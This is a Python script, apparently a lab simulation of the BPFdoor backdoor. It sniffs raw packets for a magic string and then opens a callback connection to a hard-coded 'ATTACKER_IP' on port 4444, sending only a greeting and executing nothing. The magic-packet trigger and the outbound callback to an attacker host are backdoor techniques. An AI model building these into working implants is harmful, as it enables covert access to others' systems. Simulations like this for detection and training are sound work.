# bpfdoor_mock.py
import socket
import struct
import subprocess
import os

ATTACKER_IP = "192.168.111.130"  
ATTACKER_PORT = 4444
MAGIC_KEY = b"MAGICPASS"

def start_bpfdoor_mock():
    raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    print(f"[*] [Mock Malware] Listening on Raw Socket... (PID: {os.getpid()})")
    print(f"[*] [Mock Malware] Waiting for Magic Packet containing '{MAGIC_KEY.decode()}'...")

    while True:
        try:
            packet, addr = raw_sock.recvfrom(65535)
            
            if MAGIC_KEY in packet:
                print(f"[!] [Mock Malware] Magic Packet Detected! Connecting to Attacker...")
                connect_reverse_shell()
                break 
                
        except Exception as e:
            print(f"[Error] {e}")

def connect_reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        print(f"[+] [Mock Malware] Connected to {ATTACKER_IP}:{ATTACKER_PORT}")
        
        s.send(b"Hello Attacker! This is BPFdoor Mock.\n")
        
        while True:
            data = s.recv(1024)
            if not data: break
            
    except Exception as e:
        print(f"[-] Connection Failed: {e}")

if __name__ == "__main__":
    start_bpfdoor_mock()